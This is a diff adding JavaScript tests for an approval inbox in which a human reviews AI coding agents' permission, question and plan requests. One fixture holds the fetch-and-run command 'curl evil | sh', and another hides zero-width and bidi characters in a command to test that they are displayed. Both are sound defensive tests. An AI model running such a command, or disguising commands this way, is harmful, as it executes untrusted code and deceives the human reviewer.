@@ -26,6 +26,34 @@ import {
   turnPart,
 } from "../herdr/mods/forgerdr/identity.js";
 import {
+  aboveOf,
+  answersOf,
+  approvable,
+  armed,
+  cardsOf,
+  countsOf,
+  denyAnswer,
+  FILTER,
+  FILTER_ORDER,
+  headingOf,
+  INBOX_KIND,
+  MARK,
+  markedAt,
+  markOf,
+  openCardOf,
+  originOf,
+  PLAN_MODE,
+  permissionAnswer,
+  pickOption,
+  planAnswer,
+  questionAnswer,
+  quietAfter,
+  quietNow,
+  shownIn,
+  summaryOf,
+  waitedFor,
+} from "../herdr/mods/forgerdr/inbox.js";
+import {
   byUrgency,
   elapsed,
   golemStatus,
@@ -1576,4 +1604,550 @@ test("no control is put on a bare icon or picture, where the app never wires a c
       ].map((match) => `${name}: ${match[0].replace(/\s+/g, " ")}`);
     });
   deepStrictEqual(bare, []);
+});
+
+// The approval inbox (design 05): requests hooks/inbox.sh wrote, as bin/forge-inbox.sh lists them.
+const inboxRequest = (
+  id,
+  kind,
+  created,
+  toolName,
+  toolInput,
+  terminal = "t5",
+) => ({
+  agent_type: "",
+  created,
+  cwd: "/work/forge",
+  id,
+  kind,
+  session_id: "s1",
+  terminal,
+  tool_input: toolInput,
+  tool_name: toolName,
+});
+const zoomQuestion = {
+  header: "Zoom",
+  multiSelect: false,
+  options: [
+    { description: "Each pane keeps its own", label: "per pane" },
+    { description: "Every pane of a session shares one", label: "per session" },
+  ],
+  question: "Where should a pane remember its zoom level?",
+};
+const reposQuestion = {
+  header: "Repos",
+  multiSelect: true,
+  options: [
+    { description: "", label: "front" },
+    { description: "", label: "back" },
+  ],
+  question: "Which repositories?",
+};
+
+test("what waits is a card each, the newest first; a blocked agent with no request waits in its pane", () => {
+  const requests = [
+    inboxRequest("a1", "permission", 1000, "Bash", { command: "git push" }),
+    inboxRequest(
+      "b2",
+      "question",
+      3000,
+      "AskUserQuestion",
+      { questions: [zoomQuestion] },
+      "t6",
+    ),
+    inboxRequest(
+      "c3",
+      "plan",
+      2000,
+      "ExitPlanMode",
+      { plan: "# Wire it" },
+      "t9",
+    ),
+  ];
+  const terminals = [
+    { address: "t5", state: "live", status: "blocked", status_ms: 900 },
+    { address: "t6", state: "live", status: "blocked" },
+    {
+      address: "t7",
+      state: "live",
+      status: "blocked",
+      status_ms: 2500,
+      title: "claude · fix",
+    },
+    { address: "t8", state: "finished", status: "blocked" },
+    { address: "t4", state: "live", status: "working" },
+  ];
+  const cards = cardsOf(requests, terminals);
+  deepStrictEqual(
+    cards.map((card) => [card.id, card.kind, card.terminal, card.since]),
+    [
+      ["b2", INBOX_KIND.question, "t6", 3000],
+      ["waiting:t7", INBOX_KIND.waiting, "t7", 2500],
+      ["a1", INBOX_KIND.permission, "t5", 1000],
+    ],
+  );
+  strictEqual(cards[2].request, requests[0]);
+  strictEqual(cards[1].request, null);
+});
+
+test("a session whose request just went is not shown waiting in its pane while the app catches up", () => {
+  const terminals = [
+    { address: "t5", state: "live", status: "blocked" },
+    { address: "t7", state: "live", status: "blocked" },
+  ];
+  deepStrictEqual(
+    cardsOf([], terminals, { quiet: new Set(["t5"]) }).map((card) => card.id),
+    ["waiting:t7"],
+  );
+  deepStrictEqual(
+    cardsOf(
+      [inboxRequest("a1", "permission", 1, "Bash", { command: "ls" })],
+      terminals,
+      { quiet: new Set(["t5"]) },
+    ).map((card) => card.id),
+    ["a1", "waiting:t7"],
+  );
+});
+
+test("a session is quiet for a moment after its request goes, then it can be shown waiting again", () => {
+  const before = [
+    inboxRequest("a1", "permission", 1, "Bash", { command: "ls" }, "t5"),
+    inboxRequest("b2", "permission", 2, "Bash", { command: "pwd" }, "t6"),
+  ];
+  const quiet = quietAfter(new Map(), before, [before[1]], 10_000);
+  deepStrictEqual([...quietNow(quiet, 12_000)], ["t5"]);
+  deepStrictEqual([...quietNow(quiet, 13_500)], []);
+  deepStrictEqual(
+    [...quietNow(quietAfter(quiet, [before[1]], [], 14_000), 14_500)],
+    ["t6"],
+  );
+});
+
+test("an agent has waited in its pane since the inbox first saw it blocked, never since its terminal started", () => {
+  const terminals = [
+    { address: "t5", created_ms: 1000, state: "live", status: "blocked" },
+    { address: "t7", created_ms: 1000, state: "live", status: "blocked" },
+    {
+      address: "t8",
+      created_ms: 1000,
+      state: "live",
+      status: "blocked",
+      status_ms: 4000,
+    },
+  ];
+  const cards = cardsOf([], terminals, {
+    now: 9000,
+    seen: new Map([["t5", 7000]]),
+  });
+  deepStrictEqual(
+    cards.map((card) => [card.terminal, card.since]),
+    [
+      ["t7", 9000],
+      ["t5", 7000],
+      ["t8", 4000],
+    ],
+  );
+});
+
+test("each filter counts its kind; all counts everything, the agents waiting in their panes too", () => {
+  const cards = cardsOf(
+    [
+      inboxRequest("a1", "permission", 1, "Bash", { command: "ls" }),
+      inboxRequest("a2", "permission", 2, "Write", { file_path: "/x" }),
+      inboxRequest("g1", "gate", 3, "AskUserQuestion", { questions: [] }),
+    ],
+    [
+      { address: "t5", state: "live", status: "blocked" },
+      { address: "t7", state: "live", status: "blocked" },
+    ],
+  );
+  deepStrictEqual(countsOf(cards), {
+    [FILTER.all]: 4,
+    [FILTER.gates]: 1,
+    [FILTER.permissions]: 2,
+    [FILTER.plans]: 0,
+    [FILTER.questions]: 0,
+  });
+  deepStrictEqual(
+    shownIn(cards, FILTER.permissions).map((card) => card.id),
+    ["a2", "a1"],
+  );
+  strictEqual(shownIn(cards, FILTER.all).length, 4);
+  deepStrictEqual(FILTER_ORDER, [
+    "all",
+    "permissions",
+    "questions",
+    "plans",
+    "gates",
+  ]);
+});
+
+test("a card says what it asks, every field the allow applies and whole: an allow never hides what it runs", () => {
+  const summary = (kind, tool, input) =>
+    summaryOf(inboxRequest("x", kind, 1, tool, input));
+  deepStrictEqual(
+    summary("permission", "Bash", {
+      command: "git push -u origin HEAD",
+      description: "Publish the branch",
+    }),
+    {
+      detail: "cwd /work/forge",
+      lead: "git push -u origin HEAD",
+      note: "Publish the branch",
+    },
+  );
+  deepStrictEqual(
+    summary("permission", "Bash", {
+      command: "make deploy",
+      dangerouslyDisableSandbox: true,
+      description: "Deploy",
+      timeout: 600000,
+    }).detail,
+    "cwd /work/forge\n\ndangerouslyDisableSandbox: true\n\ntimeout: 600000",
+  );
+  deepStrictEqual(
+    summary("permission", "Edit", {
+      file_path: "/w/a.js",
+      new_string: "b()",
+      old_string: "a()",
+      replace_all: true,
+    }),
+    {
+      detail: "new_string:\nb()\n\nold_string:\na()\n\nreplace_all: true",
+      lead: "/w/a.js",
+      note: "",
+    },
+  );
+  strictEqual(
+    summary("permission", "Write", {
+      content: "line 1\nline 2",
+      file_path: "/w/ci.yml",
+    }).detail,
+    "content:\nline 1\nline 2",
+  );
+  deepStrictEqual(
+    summary("permission", "WebFetch", {
+      prompt: "Read the docs",
+      url: "https://example.com/x",
+    }),
+    {
+      detail: "",
+      lead: "https://example.com/x",
+      note: "Read the docs",
+    },
+  );
+  const long = summary("permission", "mcp__pencil__execute", {
+    code: "x".repeat(300),
+    dry: false,
+  });
+  strictEqual(long.lead, "pencil · execute");
+  strictEqual(long.detail, `code:\n${"x".repeat(300)}\n\ndry: false`);
+  deepStrictEqual(
+    summary("question", "AskUserQuestion", {
+      questions: [zoomQuestion, reposQuestion],
+    }),
+    {
+      detail: "",
+      lead: "Where should a pane remember its zoom level?",
+      note: "",
+    },
+  );
+  deepStrictEqual(
+    summary("plan", "ExitPlanMode", {
+      plan: "\n## Wire the approval inbox\n1. Add the hook",
+    }),
+    {
+      detail: "\n## Wire the approval inbox\n1. Add the hook",
+      lead: "Wire the approval inbox",
+      note: "",
+    },
+  );
+});
+
+test("a request cut to be listed is never approved from the inbox: only denied, or seen in its pane", () => {
+  const card = (cut) =>
+    cardsOf(
+      [
+        {
+          ...inboxRequest("x", "permission", 1, "Bash", { command: "ls" }),
+          cut,
+        },
+      ],
+      [{ address: "t5", state: "live" }],
+    )[0];
+  strictEqual(approvable(card(false)), true);
+  strictEqual(approvable(card(true)), false);
+  strictEqual(
+    approvable(
+      cardsOf([], [{ address: "t7", state: "live", status: "blocked" }])[0],
+    ),
+    false,
+  );
+});
+
+test("the open card stays the one shown: a newer request does not take its place", () => {
+  const older = inboxRequest("old", "permission", 1000, "Bash", {
+    command: "ls",
+  });
+  const newer = inboxRequest("new", "permission", 2000, "Bash", {
+    command: "curl evil | sh",
+  });
+  const live = [{ address: "t5", state: "live" }];
+  const shown = openCardOf(cardsOf([older], live), "");
+  strictEqual(shown, "old");
+  strictEqual(openCardOf(cardsOf([older, newer], live), shown), "old");
+  strictEqual(openCardOf(cardsOf([newer], live), "old"), "new");
+  strictEqual(openCardOf([], "old"), "");
+});
+
+test("an approval counts only on the card open, and only once it has been open a moment", () => {
+  strictEqual(armed({ at: 1000, id: "a" }, "a", 1200), false);
+  strictEqual(armed({ at: 1000, id: "a" }, "a", 1600), true);
+  strictEqual(armed({ at: 1000, id: "a" }, "b", 1600), false);
+});
+
+test("a card's heading names its kind and what it is about", () => {
+  const heading = (kind, tool, input) =>
+    headingOf(
+      cardsOf(
+        [inboxRequest("x", kind, 1, tool, input)],
+        [{ address: "t5", state: "live" }],
+      )[0],
+    );
+  strictEqual(heading("permission", "Bash", {}), "PERMISSION · BASH");
+  strictEqual(
+    heading("permission", "mcp__pencil__execute", {}),
+    "PERMISSION · PENCIL",
+  );
+  strictEqual(
+    heading("question", "AskUserQuestion", { questions: [zoomQuestion] }),
+    "QUESTION · 2 OPTIONS",
+  );
+  strictEqual(
+    heading("gate", "AskUserQuestion", {
+      questions: [{ ...zoomQuestion, header: "Gate commit" }],
+    }),
+    "GATE · COMMIT",
+  );
+  strictEqual(
+    heading("plan", "ExitPlanMode", { plan: "" }),
+    "PLAN · EXITPLANMODE",
+  );
+  strictEqual(
+    headingOf(
+      cardsOf([], [{ address: "t7", state: "live", status: "blocked" }])[0],
+    ),
+    "WAITING · IN ITS PANE",
+  );
+});
+
+test("an option picked answers its question; a multi-select one takes several, in the options' order", () => {
+  const questions = [zoomQuestion, reposQuestion];
+  strictEqual(answersOf(questions, {}, {}), null);
+  let picks = pickOption(questions, {}, 0, 1);
+  picks = pickOption(questions, picks, 0, 0);
+  deepStrictEqual(picks, { 0: ["per pane"] });
+  strictEqual(answersOf(questions, picks, {}), null);
+  picks = pickOption(questions, picks, 1, 1);
+  picks = pickOption(questions, picks, 1, 0);
+  deepStrictEqual(answersOf(questions, picks, {}), {
+    "Where should a pane remember its zoom level?": "per pane",
+    "Which repositories?": "front, back",
+  });
+  picks = pickOption(questions, picks, 1, 1);
+  deepStrictEqual(picks, { 0: ["per pane"], 1: ["front"] });
+  deepStrictEqual(
+    answersOf(questions, picks, { 0: "  per pane, reset on restart " }),
+    {
+      "Where should a pane remember its zoom level?":
+        "per pane, reset on restart",
+      "Which repositories?": "front",
+    },
+  );
+  deepStrictEqual(answersOf([zoomQuestion], {}, { 0: "global" }), {
+    "Where should a pane remember its zoom level?": "global",
+  });
+  strictEqual(answersOf([zoomQuestion], {}, { 0: "   " }), null);
+});
+
+test("each answer is one its request takes, as hooks/inbox.sh checks it", () => {
+  deepStrictEqual(permissionAnswer(), { behavior: "allow" });
+  deepStrictEqual(denyAnswer("  use pnpm test:unit "), {
+    behavior: "deny",
+    message: "use pnpm test:unit",
+  });
+  deepStrictEqual(denyAnswer(""), { behavior: "deny" });
+  deepStrictEqual(questionAnswer({ "Which?": "front" }), {
+    answers: { "Which?": "front" },
+    behavior: "allow",
+  });
+  deepStrictEqual(planAnswer(PLAN_MODE.auto), {
+    behavior: "allow",
+    mode: "auto",
+  });
+  deepStrictEqual(planAnswer(PLAN_MODE.manual), {
+    behavior: "allow",
+    mode: "default",
+  });
+});
+
+test("how long a card has waited: minutes and seconds, then hours", () => {
+  strictEqual(waitedFor(0, 42_000), "0:42");
+  strictEqual(waitedFor(0, 190_000), "3:10");
+  strictEqual(waitedFor(0, 8_040_000), "2h 14m");
+  strictEqual(waitedFor(0, 18_120_000), "5h 02m");
+  strictEqual(waitedFor(5000, 1000), "0:00");
+});
+
+test("a card comes from its forge: its gnome and name, then the branch and the session", () => {
+  const main = {
+    id: "sp1",
+    name: "forgnome",
+    tabs: [{ id: "tb1", name: "claude · main" }],
+  };
+  const worktree = {
+    id: "sp2",
+    name: "approval-inbox",
+    tabs: [
+      { id: "tb2", name: "claude · inbox" },
+      { id: "tb3", name: "3" },
+    ],
+  };
+  const dotfiles = {
+    id: "sp3",
+    name: "dotfiles",
+    tabs: [{ id: "tb4", name: "claude · fix" }],
+  };
+  const forges = [
+    { key: "/code/forgnome/.git", main, spaces: [main, worktree] },
+    { key: "space:sp3", main: dotfiles, spaces: [dotfiles] },
+  ];
+  const panes = [
+    { branch: "main", tab: "tb1", terminal: "t5" },
+    { branch: "feature/#12-approval-inbox", tab: "tb2", terminal: "t6" },
+    { branch: null, tab: "tb3", terminal: "t8" },
+    { branch: null, tab: "tb4", terminal: "t2" },
+  ];
+  const origin = (address, terminals = []) => {
+    const { forge, path } = originOf(address, forges, panes, terminals);
+    return [forge?.key ?? null, path];
+  };
+  deepStrictEqual(origin("t6"), [
+    "/code/forgnome/.git",
+    ["forgnome", "feature/#12-approval-inbox", "claude · inbox"],
+  ]);
+  deepStrictEqual(origin("t8"), ["/code/forgnome/.git", ["forgnome", "3"]]);
+  deepStrictEqual(origin("t2"), ["space:sp3", ["dotfiles", "claude · fix"]]);
+  deepStrictEqual(
+    origin("t9", [{ address: "t9", parent: "t5", title: "explore" }]),
+    ["/code/forgnome/.git", ["forgnome", "main", "claude · main", "explore"]],
+  );
+  deepStrictEqual(origin("t3"), [null, ["t3"]]);
+  // Two pane-less agents that name each other as their session do not send it round for ever.
+  deepStrictEqual(
+    origin("t11", [
+      { address: "t11", parent: "t12", title: "one" },
+      { address: "t12", parent: "t11", title: "two" },
+    ]),
+    [null, ["t11", "two", "one"]],
+  );
+});
+
+test("an answer is stamped gold for a yes and red for a no; a gate's yes is its first option", () => {
+  const card = (kind, input) => ({
+    id: "x",
+    kind,
+    request: inboxRequest("x", kind, 1, "AskUserQuestion", input),
+    since: 1,
+    terminal: "t5",
+  });
+  const gateQuestion = {
+    header: "Gate commit",
+    multiSelect: false,
+    options: [
+      { description: "As drafted", label: "Commit" },
+      { description: "Keep working", label: "Not yet" },
+    ],
+    question: "Commit feat: add the inbox?",
+  };
+  const gate = card("gate", { questions: [gateQuestion] });
+  strictEqual(markOf(card("permission", {}), permissionAnswer()), MARK.yes);
+  strictEqual(markOf(card("permission", {}), denyAnswer("no")), MARK.no);
+  strictEqual(markOf(card("plan", {}), planAnswer(PLAN_MODE.manual)), MARK.yes);
+  strictEqual(markOf(card("plan", {}), denyAnswer("")), MARK.no);
+  strictEqual(
+    markOf(
+      card("question", { questions: [zoomQuestion] }),
+      questionAnswer({ [zoomQuestion.question]: "global" }),
+    ),
+    MARK.yes,
+  );
+  strictEqual(
+    markOf(gate, questionAnswer({ [gateQuestion.question]: "Commit" })),
+    MARK.yes,
+  );
+  strictEqual(
+    markOf(gate, questionAnswer({ [gateQuestion.question]: "Not yet" })),
+    MARK.no,
+  );
+  strictEqual(
+    markOf(
+      gate,
+      questionAnswer({ [gateQuestion.question]: "Commit, but squash first" }),
+    ),
+    MARK.no,
+  );
+});
+
+test("a card answered says when, on the local clock", () => {
+  const at = new Date(2026, 10, 19, 16, 42, 7).getTime();
+  strictEqual(markedAt(at), "answered 16:42");
+  strictEqual(
+    markedAt(new Date(2026, 10, 19, 9, 5).getTime()),
+    "answered 09:05",
+  );
+});
+
+test("what a card shows of a request leaves nothing invisible: zero-width, bidi and control characters are spelt out", () => {
+  const hidden = (code) => String.fromCodePoint(code);
+  const sneaky =
+    `ls${hidden(0x200b)} -la${hidden(0x202e)} txt.exe${hidden(0x7)}TAB_end\nnext`.replace(
+      "TAB_",
+      "\t",
+    );
+  const { lead } = summaryOf(
+    inboxRequest("x", "permission", 1, "Bash", { command: sneaky }),
+  );
+  strictEqual(lead, `ls\\u{200B} -la\\u{202E} txt.exe\\u{7}\tend\nnext`);
+  strictEqual(
+    summaryOf(
+      inboxRequest("x", "permission", 1, "Write", {
+        content: `a${hidden(0xfeff)}b`,
+        file_path: "/w/x",
+      }),
+    ).detail,
+    `content:\na\\u{FEFF}b`,
+  );
+  const more = [0xad, 0x2028, 0xfe0f, 0xe0101].map(hidden).join("|");
+  strictEqual(
+    summaryOf(inboxRequest("x", "permission", 1, "Bash", { command: more }))
+      .lead,
+    "\\u{AD}|\\u{2028}|\\u{FE0F}|\\u{E0101}",
+  );
+});
+
+test("what shows above the open card is noted, so a card that moved under the pointer is armed again", () => {
+  const live = [{ address: "t5", state: "live" }];
+  const cards = cardsOf(
+    [
+      inboxRequest("c", "permission", 3, "Bash", { command: "c" }),
+      inboxRequest("b", "permission", 2, "Bash", { command: "b" }),
+      inboxRequest("a", "permission", 1, "Bash", { command: "a" }),
+    ],
+    live,
+  );
+  strictEqual(aboveOf(cards, "b"), "c");
+  strictEqual(aboveOf(cards, "a"), "c b");
+  strictEqual(aboveOf(cards, "c"), "");
+  strictEqual(aboveOf(cards, "gone"), "");
 });
